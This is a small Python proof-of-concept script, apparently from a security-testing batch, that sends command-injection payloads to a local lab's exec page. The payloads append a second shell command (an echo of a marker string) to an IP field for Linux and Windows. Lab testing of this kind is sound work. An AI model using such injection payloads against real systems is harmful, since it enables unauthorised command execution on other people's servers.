#!/usr/bin/env python3
# Source: optional3/batches/dsh-20261025/raw_outputs/guarded/A04-1.json
#         finding CMD-001-C1, poc.status="需人工适配", execution_status="未运行"
# Adaptation: LAB_URL port 8080 -> 9080 (the port documented for the local lab).
#             Single literal change; no other edits. Adapted file is what was approved.
import sys
import urllib.parse
import urllib.request

LAB_URL = "http://127.0.0.1:9080/vulnerabilities/exec/"

PAYLOADS = {
    "linux": "127.0.0.1; echo LAB_POC_MARKER_A04",
    "windows": "127.0.0.1 & echo LAB_POC_MARKER_A04",
}


def send(target_os):
    body = urllib.parse.urlencode({
        "ip": PAYLOADS[target_os],
        "Submit": "Submit",
    }).encode("utf-8")
    req = urllib.request.Request(LAB_URL, data=body, method="POST")
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.read().decode("utf-8", "replace")


if __name__ == "__main__":
    branch = sys.argv[1] if len(sys.argv) > 1 else "linux"
    print(send(branch))